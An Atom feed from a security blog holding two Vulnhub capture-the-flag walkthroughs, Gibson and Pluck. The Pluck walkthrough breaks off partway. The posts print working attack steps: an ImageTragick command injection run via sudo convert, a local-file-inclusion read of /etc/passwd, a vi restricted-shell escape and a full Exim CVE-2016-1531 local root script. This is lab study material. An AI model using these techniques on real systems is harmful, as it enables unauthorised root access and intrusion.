<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: writeups | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/writeups/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2017-11-11T17:41:52-05:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Gibson 0.2 walkthrough]]></title>
    <link href="http://chousensha.github.io/blog/2017/10/28/gibson-0-dot-2-walkthrough/"/>
    <updated>2017-10-28T16:10:23-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/10/28/gibson-0-dot-2-walkthrough</id>
    <content type="html"><![CDATA[<p>The Vulnhub machine I picked for today&rsquo;s target is called Gibson. For this challenge, there are also some hints:</p>

<ul>
<li>SSH can forward X11.</li>
<li>The challenge isn&rsquo;t over with root. The flag is not where you expect to find it.</li>
</ul>


<p>Let&rsquo;s see what Gibson has in store for us!</p>

<!-- more -->


<h2>Recon</h2>

<p><code>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 fb:f6:d1:57:64:fa:38:66:2d:66:40:12:a4:2f:75:b4 (DSA)
|   2048 32:13:58:ae:32:b0:5d:b9:2a:9c:87:9c:ae:79:3b:2e (RSA)
|_  256 3f:dc:7d:94:2f:86:f1:83:41:db:8c:74:52:f0:49:43 (ECDSA)
80/tcp open  http    Apache httpd 2.4.7
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 273   2016-05-07 13:03  davinci.html
|_
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Index of /
</code></p>

<p>Looks like we only have SSH and a web server running on this box. The Gibson Mining Corporation page contains a  davinci.html file with a bolded message: <code>The answer you seek will be found by brute force</code>. And the page source also has an interesting comment:</p>

<p>```</p>

<!-- Damn it Margo! Stop setting your password to "god" -->


<!-- at least try and use a different one of the 4 most -->


<!-- common ones! (eugene) -->


<p>```</p>

<p>With this information in hand, I tried SSH'ing as Margo with password god. That didn&rsquo;t work, but doing it as margo instead got me in. We have a shell on the box already!</p>

<h2>Privilege escalation</h2>

<p>We&rsquo;re in as margo, but we need root. I ran my <a href="https://github.com/chousensha/linux_privcheck">linux_pricheck script</a> and sifted through the output to see what might be helpful. Some of the discoveries:</p>

<ul>
<li>there is a network interface connected to a different subnet:</li>
</ul>


<p>```
virbr0    Link encap:Ethernet  HWaddr fe:54:00:72:e2:fb</p>

<pre><code>      inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0
      UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
      RX packets:7 errors:0 dropped:0 overruns:0 frame:0
      TX packets:17 errors:0 dropped:0 overruns:0 carrier:0
      collisions:0 txqueuelen:0 
      RX bytes:1347 (1.3 KB)  TX bytes:2459 (2.4 KB)
</code></pre>

<p>```</p>

<ul>
<li>VNC is running on the localhost:</li>
</ul>


<p><code>
tcp        0      0 127.0.0.1:5900          0.0.0.0:*               LISTEN      -               
</code></p>

<ul>
<li>user marvo has some sudo privileges that need to be checked out:</li>
</ul>


<p>```
User margo may run the following commands on gibson:</p>

<pre><code>(ALL) NOPASSWD: /usr/bin/convert
</code></pre>

<p>```</p>

<ul>
<li>other users on the host are duke and eugene</li>
</ul>


<p>Alright, we have a solid start. First thing I did was check that convert binary:</p>

<p>```
margo@gibson:~$ /usr/bin/convert
Version: ImageMagick 6.7.7-10 2014-03-06 Q16 <a href="http://www.imagemagick.org">http://www.imagemagick.org</a>
Copyright: Copyright &copy; 1999-2012 ImageMagick Studio LLC
Features: OpenMP</p>

<p>Usage: convert [options &hellip;] file [ [options &hellip;] file &hellip;] [options &hellip;] file
[&hellip;]
```</p>

<p>ImageMagick? More like <a href="https://www.exploit-db.com/exploits/39767/">ImageTragick</a>. This particular version of the ImageMagick library is vulnerable to command execution due to insufficient filtering in shell characters.</p>

<blockquote><p>Insufficient filtering for filename passed to delegate&rsquo;s command allows
remote code execution during conversion of several file formats.</p>

<p>ImageMagick allows to process files with external libraries. This
feature is called &lsquo;delegate&rsquo;. It is implemented as a system() with command string (&lsquo;command&rsquo;)</p>

<p>One of the default delegate&rsquo;s command is used to handle https requests:</p>

<p>&ldquo;wget&rdquo; -q -O &ldquo;%o&rdquo; &ldquo;<a href="https:%M">https:%M</a>&rdquo;</p>

<p>Due to insufficient %M param filtering it is possible to conduct shell command injection, where %M is the actual
link from the input. It is possible to pass the value like <code>https://example.com"|ls "-la</code> and
execute unexpected &lsquo;ls -la&rsquo;. (wget or curl should be installed)</p></blockquote>

<p>So, the injection would look like this:</p>

<p><code>/usr/bin/convert &lsquo;<a href="https://dummyurl">https://dummyurl</a>"| command"&rsquo; tragic.png</code></p>

<p>And if the command takes arguments:</p>

<p><code>/usr/bin/convert &lsquo;<a href="https://dummyurl">https://dummyurl</a>"| command"-flags&rsquo; tragic.png</code></p>

<p>Of course, you are not limited to the pipe character. You can also use <strong>;</strong>.</p>

<p>Since the convert binary runs with sudo privileges, it is possible to escalate privileges by editing <strong>/etc/sudoers</strong>:</p>

<p><code>
margo@gibson:~$ sudo /usr/bin/convert 'https://dummyurl";vim /etc/sudoers"' tragic.png
</code></p>

<p>The sudoers file will pop up in vim, and I gave full access to margo:</p>

<p>```</p>

<h1>User privilege specification</h1>

<p>root    ALL=(ALL:ALL) ALL</p>

<p>margo    ALL=(ALL:ALL) ALL
```</p>

<p>Also, some other interesting tidbits in the the sudoers file:</p>

<p>```</p>

<h1>Allow members of group sudo to execute any command</h1>

<h2>disabled after Margo&rsquo;s security incident</h2>

<h2>%sudo ALL=(ALL:ALL) ALL</h2>

<h1>Allow Margo to convert pictures from the FTP server</h1>

<p>margo ALL=(ALL) NOPASSWD: /usr/bin/convert</p>

<h1>Allow eugene to manage virtual machines and visudo</h1>

<p>eugene ALL=(ALL) NOPASSWD: /usr/bin/virt-manager
eugene ALL=(ALL:ALL)  /usr/sbin/visudo
```</p>

<p>I quit vim with <code>:wq!</code> to override the warning I got. The convert binary throws some errors, but the code was executed!</p>

<p><code>
convert: unable to open image `/tmp/magick-AJXBjcDc': No such file or directory @ error/blob.c/OpenBlob/2638.
convert: unable to open file `/tmp/magick-AJXBjcDc': No such file or directory @ error/constitute.c/ReadImage/583.
convert: no images defined `tragic.png' @ error/convert.c/ConvertImageCommand/3044.
margo@gibson:~$ sudo su
[sudo] password for margo:
root@gibson:/home/margo#
</code></p>

<p>From the system recon we performed, we know there is a VM running on the host. I re-ran my SSH connection with the <strong>-X</strong> flag to enable X11 forwarding, because I wanted to use virt-manager to take a look at the VM. However, I got an error: <code>X11 connection rejected because of wrong authentication</code>. Not a problem, we have virsh!</p>

<p>```
root@gibson:~# virsh list &mdash;all</p>

<h2> Id    Name                           State</h2>

<p> 2     ftpserv                        running
```</p>

<p>At this point, I wanted to make things easier for me, so I decided to get the VM to my own system and continue from there. I located the VM:</p>

<p><code>
ls /var/lib/libvirt/images/
ftpserv.img
</code></p>

<p>To transfer the VM using scp, I first needed to enable SSH'ing as root. I edited <code>/etc/ssh/sshd_config</code> to have the following:</p>

<p>```
PermitRootLogin yes
AllowUsers eugene margo root
Match user root</p>

<pre><code>PasswordAuthentication yes
</code></pre>

<p>```</p>

<p>Then I changed root&rsquo;s password, and reloaded the SSH config file with <code>service ssh reload</code>. Now I was able to transfer the image:</p>

<p><code>
scp root@192.168.217.148:/var/lib/libvirt/images/ftpserv.img /mnt/ftpserv.img
Ubuntu 14.04.3 LTS
root@192.168.217.148's password:
ftpserv.img                                   100%  512MB  22.6MB/s   00:22    
</code></p>

<p>Let&rsquo;s see what we have here:</p>

<p><code>
file ftpserv.img
ftpserv.img: DOS/MBR boot sector, FREE-DOS Beta 0.9 MBR; partition 1 : ID=0xe, active, start-CHS (0x0,1,1), end-CHS (0xf,15,63), startsector 63, 1048257 sectors
</code></p>

<p>To mount it, we need to learn the offset:</p>

<p>```
fdisk -l ftpserv.img
Disk ftpserv.img: 512 MiB, 536870912 bytes, 1048576 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x00000000</p>

<p>Device       Boot Start     End Sectors   Size Id Type
ftpserv.img1 *       63 1048319 1048257 511.9M  e W95 FAT16 (LBA)
```</p>

<p>So the start block is 63 and the block size is 512..then the offset is 63 * 512, or 32256. Time to mount the image:</p>

<p><code>
root@kali:/mnt# mkdir ftpserv
mount -o loop,offset=32256 ftpserv.img ftpserv
</code></p>

<p>Mounting is done via the loop device, which is a file that acts as a block-based device. Now, a new device called KFLYNN appeared on my system. Kevin Flynn, maybe? Anyway, let&rsquo;s look inside:</p>

<p><code>
ls ftpserv
AUTOEXEC.BAT  COMMAND.COM  FDCONFIG.SYS  KERNEL.SYS
BOOTSECT.BIN  DOS          GARBAGE       net
</code></p>

<p>The GARBAGE directory seems interesting:</p>

<p><code>
ls GARBAGE/
adminspo.jpg  flag.img  jz_ug.ans
</code></p>

<p>Let&rsquo;s see the picture first:</p>

<p><img class="center" src="/images/pentest/gibson/adminspo.jpg" title="&lsquo;sysadmin&rsquo; &lsquo;sysadmin life&rsquo;" ></p>

<p>I also ran exiftool on it and was rewarded with..something:</p>

<p><code>
exiftool adminspo.jpg
ExifTool Version Number         : 10.60
File Name                       : adminspo.jpg
Directory                       : .
File Size                       : 120 kB
File Modification Date/Time     : 2016:05:04 17:17:44-04:00
File Access Date/Time           : 2017:10:01 15:14:34-04:00
File Inode Change Date/Time     : 2016:05:04 17:31:08-04:00
File Permissions                : rwxr-xr-x
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Big-endian (Motorola, MM)
Image Description               : Rabbit.. Flu Shot... TYPE COOKE YOU IDIOT! I'll head them off at the pass
Modify Date                     : 2016:05:04 22:29:32
Artist                          : Virtualization is fun.. What's more, esoteric OSes on 192.168.122 are even more fun
User Comment                    : So there's info here.... Images, hmm... Wasn't that a CVE...? Oh yes... CVE 2016-3714....http://www.openwall.com/lists/oss-security/2016/05/03/18 so which person can run it. Perhaps the man who knew a lot about Sean Connery in Trainspotting when he wasn't  causing a 7 point drop in the NYSE
[...]
</code></p>

<p>Next I looked at the ANS file:</p>

<p><code>
file jz_ug.ans
jz_ug.ans: ISO-8859 text, with CRLF line terminators, with escape sequences
</code></p>

<p>Apparently, this type of file is a text document graphic based on the ANSI text standard; may also be used to store text graphics, which uses characters to display images in a text document. I read it like a text file:</p>

<p>```
cat jz_ug.ans</p>

<p>   �������ݲܱ����ܲ����۲ܱ�������������ܲ�ܲ������������ܲ�ܱ��ܲ�ܱ����</p>

<pre><code>�����������������������������������������������������۲���������������
�������������������������۲���������� ��������۲�����۲���������������
���������������������������������������������������� �����������������
޲���������۲�����۲�����������    �����۲���    ����������߲������۲�
 ��߱� ����������߲����������߲    �����߲���    ����߲���߲��ݲ����߲jz
                              �                            �         �
                the ugliest of all are under 5 feet tall
</code></pre>

<p>```</p>

<p>Hmm, ok. Finally, another image file:</p>

<p><code>
file flag.img
flag.img: Linux rev 1.0 ext2 filesystem data, UUID=d59bdd40-ec37-4d24-a956-80f549846121
</code></p>

<p>This time it&rsquo;s an EXT2 filesystem. I mounted it:</p>

<p><code>
mount ftpserv/GARBAGE/flag.img flag
ls -la
total 70
drwxr-xr-x 4 root root  1024 May 14  2016 .
drwxr-xr-x 5 root root  4096 Oct 28 13:05 ..
-rwxrwxr-x 1 root root 21358 Nov 15  2011 davinci
-rw-r--r-- 1 root root 28030 Nov 15  2011 davinci.c
-rw-r--r-- 1 root root   159 May  5  2016 hint.txt
drwx------ 2 root root 12288 May  5  2016 lost+found
drwxr-xr-x 2 root root  1024 May  5  2016 .trash
</code></p>

<p>Davinci is a snake game:</p>

<p>```</p>

<pre><code>        _________         _________             
       /         \       /         \            
      /  /~~~~~\  \     /  /~~~~~\  \           
      |  |     |  |     |  |     |  |           
      |  |     |  |     |  |     |  |           
      |  |     |  |     |  |     |  |         / 
      |  |     |  |     |  |     |  |       //  
     (o  o)    \  \_____/  /     \  \_____/ /   
      \__/      \         /       \        /    
        |        ~~~~~~~~~         ~~~~~~~~         
        ^                               
        Welcome To The Snake Game!          
                Press Any Key To Continue...    
</code></pre>

<p>```</p>

<p>Its source code hints that it&rsquo;s vulnerable to buffer overflow if more than 128 characters are entered. Let&rsquo;s look at the hint now:</p>

<p><code>
cat hint.txt
http://www.imdb.com/title/tt0117951/ and
http://www.imdb.com/title/tt0113243/ have
someone in common... Can you remember his
original nom de plume in 1988...?
</code></p>

<p>The IMDB references are for the movies Trainspotting and Hackers. And who do they have in common? Jonny Lee Miller. You can find the name referenced in the hint by reading the description for the Hackers movie. It&rsquo;s a handle: Zero Cool.</p>

<p>And finally, the hidden directory:</p>

<p><code>
ls -l
total 317
---x------ 1 root root    469 May 14  2016 flag.txt.gpg
-rw-r--r-- 1 root root 320130 Sep  7  2015 LeithCentralStation.jpg
</code></p>

<p>The image is an ad for Trainspotting and has nothing out of the ordinary in the exiftool output. And, of course, the best for last! It seems we have a flag, but it&rsquo;s encrypted. I tried some ZeroCool variations, but it seems more calculation power will need to be thrown at this. I made a file with the handle to be transformed in many possible passwords by John:</p>

<p><code>
cat tries.txt
zero cool
zerocool
zero kool
zerokool
</code></p>

<p>Next I used John to generate a file of uppercase and lowercase combinations from this initial file:</p>

<p><code>
john --rules=nt --wordlist=tries.txt --stdout &gt; pass.txt
Created directory: /root/.john
Press 'q' or Ctrl-C to abort, almost any other key for status
1504p 0:00:00:01 100.00% (2017-10-28 13:37) 1139p/s ZERO KOOL
</code></p>

<p>And after so many hacker references, also add l33t speak to the combinations, with Korelogic rules. First, download the rules file:</p>

<p><code>
wget http://openwall.info/wiki/_media/john/korelogic-rules-20100801.txt
</code></p>

<p>Now add the rules to John&rsquo;s config file:</p>

<p><code>
cat korelogic-rules-20100801.txt &gt;&gt; /etc/john/john.conf
</code></p>

<p>Now I was able to generate the file with p@$$w0rd$:</p>

<p><code>
john --rules=KoreLogicRulesL33t --wordlist=pass.txt --stdout &gt; coolpass.txt
Press 'q' or Ctrl-C to abort, almost any other key for status
132384p 0:00:00:00 100.00% (2017-10-28 13:54) 240698p/s Z3ro k0o1
</code></p>

<p>And a quick shell script for bruteforcing from the file:</p>

<p>```
for pass in $(cat coolpass.txt) ; do</p>

<pre><code>echo "Trying:" $pass
gpg --batch --status-fd --with-colons --output flag.txt --passphrase $pass --decrypt flag.txt.gpg
if [ -a "flag.txt" ]; then echo "Passphrase found! $pass"
break
fi
</code></pre>

<p>done
```</p>

<p>The correct passphrase is <strong>Z3r0K00l</strong></p>

<p><code>
Trying: Z3r0K00l
gpg: CAST5 encrypted data
[GNUPG:] NEED_PASSPHRASE_SYM 3 3 2
gpg: encrypted with 1 passphrase
[GNUPG:] BEGIN_DECRYPTION
[GNUPG:] DECRYPTION_INFO 0 3
[GNUPG:] PLAINTEXT 62 1463231918 flag.txt
[GNUPG:] PLAINTEXT_LENGTH 862
[GNUPG:] DECRYPTION_OKAY
gpg: WARNING: message was not integrity protected
[GNUPG:] END_DECRYPTION
Passphrase found! Z3r0K00l
</code></p>

<p>And the flag is:</p>

<p>```
cat flag.txt</p>

<hr />

<p>| | | | <strong> _  </strong><em>| | __ |</em>   <em>| |<strong>   </strong></em>   |  _ \| | <strong> _ _ </strong>   <strong><em>| |</em>| |
| |<em>| |/ </em><code>|/ __| |/ /   | | | '_ \ / _ \  | |_) | |/ _</code> | &lsquo;_ \ / _ \ </strong>| |
|  _  | (<em>| | (<strong>|   &lt;    | | | | | |  </strong>/  |  __/| | (</em>| | | | |  <strong>/ |<em>|</em>|
|<em>| |</em>|_<em>,</em>|_</strong>|<em>|_\   |</em>| |<em>| |</em>|_<strong>|  |<em>|   |</em>|_<em>,</em>|<em>| |</em>|_</strong>|_<em>(</em>)</p>

<p>Should you not be standing in a 360 degree rotating payphone when reading
this flag&hellip;? B-)</p>

<p>Anyhow, congratulations once more on rooting this VM. This time things were
a bit esoteric, but I hope you enjoyed it all the same.</p>

<p>Shout-outs again to #vulnhub for hosting a great learning tool. A special
thanks goes to g0blin and GKNSB for testing, and to g0tM1lk for the offer
to host the CTF once more.</p>

<pre><code>                                                          --Knightmare
</code></pre>

<p>```</p>

<p><strong>Learn more</strong></p>

<ul>
<li><a href="https://imagetragick.com/">ImageTragick</a></li>
</ul>


<p>```</p>

<hr />

<p>/ Q: Why is Christmas just like a day at \
| the office? A: You do all of the work  |
| and the fat guy in the suit            |
|                                        |
\ gets all the credit.                   /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Got Pluck?]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/06/got-pluck/"/>
    <updated>2017-07-06T06:28:41-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/06/got-pluck</id>
    <content type="html"><![CDATA[<p>New day, new machine to hack! Today&rsquo;s target is called Pluck.</p>

<!-- more -->


<h2>Recon</h2>

<p>Nmap results:</p>

<p><code>
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e8:87:ba:3e:d7:43:23:bf:4a:6b:9d:ae:63:14:ea:71 (RSA)
|_  256 8f:8c:ac:8d:e8:cc:f9:0e:89:f7:5d:a0:6c:28:56:fd (ECDSA)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Pluck
3306/tcp open  mysql   MySQL (unauthorized)
5355/tcp open  llmnr?
</code></p>

<p>First order of business, the web server:</p>

<p><img class="center" src="/images/pentest/pluck/pluck.png" title="&lsquo;pluck&rsquo; &lsquo;pluck&rsquo;" ></p>

<p>I ran Nikto on it and it revealed a couple of vulnerabilities:</p>

<p><code>
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)
+ OSVDB-29786: /admin.php?en_log_id=0&amp;action=config: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
+ OSVDB-29786: /admin.php?en_log_id=0&amp;action=users: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
+ OSVDB-3092: /admin.php: This might be interesting...
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3268: /images/?pattern=/etc/*&amp;sort=name: Directory indexing found.
+ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7535 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2017-07-06 09:41:42 (GMT-4) (22 seconds)
</code></p>

<p>First, I went to the admin page and it seems vulnerable to SQL injection:</p>

<p><img class="center" src="/images/pentest/pluck/admin.png" title="&lsquo;admin&rsquo; &lsquo;admin sqli&rsquo;" ></p>

<p>I fired up sqlmap but I couldn&rsquo;t get anything out of the database. Maybe it was a false lead. Next I looked at the LFI vulnerability that Nikto detected and took a peak at <em>/etc/passwd</em>:</p>

<p><code>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:109::/var/run/dbus:/bin/false
mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
lxd:x:108:65534::/var/lib/lxd/:/bin/false
uuidd:x:109:114::/run/uuidd:/bin/false
dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:112:1::/var/cache/pollinate:/bin/false
bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
Debian-exim:x:113:119::/var/spool/exim4:/bin/false
peter:x:1001:1001:,,,:/home/peter:/bin/bash
paul:x:1002:1002:,,,:/home/paul:/usr/bin/pdmenu
backup-user:x:1003:1003:Just to make backups easier,,,:/backups:/usr/local/scripts/backup.sh
</code></p>

<p>The last entry is interesting. I used the LFI to look at the script:</p>

<p>```</p>

<h6>#</h6>

<h1>Server Backup script</h1>

<h6>#</h6>

<h1>Backup directories in /backups so we can get it via tftp</h1>

<p>echo &ldquo;Backing up data&rdquo;
tar -cf /backups/backup.tar /home /var/www/html > /dev/null 2&amp; > /dev/null
echo &ldquo;Backup complete&rdquo;
```</p>

<p>A TFTP reference, and I didn&rsquo;t scan for UDP ports. I went back to Nmap real quick:</p>

<p>```
nmap -T4 -sU -p69 192.168.217.147</p>

<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-07-06 09:59 EDT
Nmap scan report for 192.168.217.147
Host is up (0.00016s latency).
PORT   STATE         SERVICE
69/udp open|filtered tftp
```</p>

<p>I got the archive via T<a href="FTP:">FTP:</a></p>

<p><code>
tftp 192.168.217.147
tftp&gt; get /backups/backup.tar
Received 1824718 bytes in 1.4 seconds
</code></p>

<p>Extracted it to find some home directory contents, besides the source for the website:</p>

<p><code>
tar -xvf backup.tar
home/
home/bob/
home/bob/.bashrc
home/bob/.sudo_as_admin_successful
home/bob/.profile
home/bob/.bash_logout
home/paul/
home/paul/keys/
home/paul/keys/id_key3.pub
home/paul/keys/id_key2.pub
home/paul/keys/id_key2
home/paul/keys/id_key4.pub
home/paul/keys/id_key5.pub
home/paul/keys/id_key6
home/paul/keys/id_key1
home/paul/keys/id_key5
home/paul/keys/id_key1.pub
home/paul/keys/id_key6.pub
home/paul/keys/id_key4
home/paul/keys/id_key3
home/paul/.bashrc
home/paul/.profile
home/paul/.bash_logout
home/peter/
home/peter/.bashrc
home/peter/.profile
home/peter/.bash_logout
var/www/html/
var/www/html/fonts/
var/www/html/fonts/glyphicons-halflings-regular.svg
var/www/html/fonts/glyphicons-halflings-regular.woff2
var/www/html/fonts/glyphicons-halflings-regular.ttf
var/www/html/fonts/glyphicons-halflings-regular.woff
var/www/html/fonts/glyphicons-halflings-regular.eot
var/www/html/about.php
var/www/html/index.php
var/www/html/footer.php
var/www/html/css/
var/www/html/css/bootstrap.css.map
var/www/html/css/bootstrap.min.css.map
var/www/html/css/bootstrap-theme.css
var/www/html/css/bootstrap-theme.min.css
var/www/html/css/bootstrap.min.css
var/www/html/css/bootstrap-theme.min.css.map
var/www/html/css/bootstrap-theme.css.map
var/www/html/css/bootstrap.css
var/www/html/header.php
var/www/html/admin.php
var/www/html/js/
var/www/html/js/jquery.min.js
var/www/html/js/bootstrap.js
var/www/html/js/npm.js
var/www/html/js/bootstrap.min.js
</code></p>

<p>Bob&rsquo;s directory:</p>

<p><code>
root@kali:~/home/bob# ls -la
total 20
drwxr-xr-x 2 1000 1000 4096 Jan 18 07:43 .
drwxr-xr-x 5 root root 4096 Jan 18 03:27 ..
-rw-r--r-- 1 1000 1000  220 Jan 18 00:39 .bash_logout
-rw-r--r-- 1 1000 1000 3771 Jan 18 00:39 .bashrc
-rw-r--r-- 1 1000 1000  655 Jan 18 00:39 .profile
-rw-r--r-- 1 1000 1000    0 Jan 18 03:40 .sudo_as_admin_successful
</code></p>

<p>That sudo file was empty. On to paul:</p>

<p><code>
root@kali:~/home/paul# ls -la
total 24
drwxr-xr-x 3 1002 1002 4096 Jan 18 13:13 .
drwxr-xr-x 5 root root 4096 Jan 18 03:27 ..
-rw-r--r-- 1 1002 1002  220 Jan 18 03:04 .bash_logout
-rw-r--r-- 1 1002 1002 3771 Jan 18 03:04 .bashrc
drwxrwxr-x 2 1002 1002 4096 Jan 18 13:09 keys
-rw-r--r-- 1 1002 1002  655 Jan 18 03:04 .profile
root@kali:~/home/paul# ls -la keys/
total 56
drwxrwxr-x 2 1002 1002 4096 Jan 18 13:09 .
drwxr-xr-x 3 1002 1002 4096 Jan 18 13:13 ..
-rwxrwxr-x 1 1002 1002  668 Jan 18 13:08 id_key1
-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key1.pub
-rwxrwxr-x 1 1002 1002  672 Jan 18 13:08 id_key2
-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key2.pub
-rwxrwxr-x 1 1002 1002  668 Jan 18 13:08 id_key3
-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key3.pub
-rwxrwxr-x 1 1002 1002 1679 Jan 18 13:09 id_key4
-rwxrwxr-x 1 1002 1002  392 Jan 18 13:09 id_key4.pub
-rwxrwxr-x 1 1002 1002  668 Jan 18 13:08 id_key5
-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key5.pub
-rwxrwxr-x 1 1002 1002 1675 Jan 18 13:09 id_key6
-rwxrwxr-x 1 1002 1002  392 Jan 18 13:09 id_key6.pub
</code></p>

<p>It looks like paul didn&rsquo;t put much effort into securing his SSH keys. Lastly, peter:</p>

<p><code>
root@kali:~/home/peter# ls -la
total 20
drwxr-xr-x 2 1001 1001 4096 Jan 18 03:04 .
drwxr-xr-x 5 root root 4096 Jan 18 03:27 ..
-rw-r--r-- 1 1001 1001  220 Jan 18 03:04 .bash_logout
-rw-r--r-- 1 1001 1001 3771 Jan 18 03:04 .bashrc
-rw-r--r-- 1 1001 1001  655 Jan 18 03:04 .profile
</code></p>

<h2>Privilege escalation</h2>

<p>Back to paul, and trying those SSH keys. Tried each, the 4th one worked, but it dropped me to this menu:</p>

<p><img class="center" src="/images/pentest/pluck/pdmenu.png" title="&lsquo;pdmenu&rsquo; &lsquo;pdmenu&rsquo;" ></p>

<p>So, what is pdmenu?</p>

<blockquote><p>Pdmenu is a full screen menuing system for Unix. It is designed to be easy to use, and is suitable as a login shell
for inexperienced users, or it can just be ran at the command line as a handy menu.</p></blockquote>

<p>Not much I can do with this, however, the option to edit a file launches vi! I remembered another challenge where vi helped me escape shell restrictions, and found a <a href="https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells">SANS article</a> about this exact topic. To get a proper shell, I typed the following in vi&rsquo;s command mode:</p>

<p><code>
:set shell=/bin/bash
:!bash
</code></p>

<p>That dropped me into paul&rsquo;s shell:</p>

<p><code>
paul@pluck:~$ id
uid=1002(paul) gid=1002(paul) groups=1002(paul)
</code></p>

<p>SUID enumeration led me to the next step:</p>

<p><code>
paul@pluck:~$ find / -perm -4000 2&gt;/dev/null
/usr/exim/bin/exim-4.84-7
/usr/bin/passwd
/usr/bin/at
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/bin/chsh
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/s-nail/s-nail-privsep
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/bin/su
/bin/umount
/bin/mount
/bin/fusermount
/bin/ping
/bin/ntfs-3g
</code></p>

<p>Exim is a MTA similar to sendmail. Googling for an exploit yielded a <a href="https://www.exploit-db.com/exploits/39535/">local root exploit</a>. I used vi to create a shell script with the exploit code, changed it to executable and ran it:</p>

<p>```
paul@pluck:~$ vi rootme.sh
paul@pluck:~$ cat rootme.sh
echo [ CVE-2016-1531 local root exploit
cat > /tmp/root.pm &lt;&lt; EOF
package root;
use strict;
use warnings;</p>

<p>system(&ldquo;/bin/sh&rdquo;);
EOF
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps</p>

<p>paul@pluck:~$ ./rootme.sh
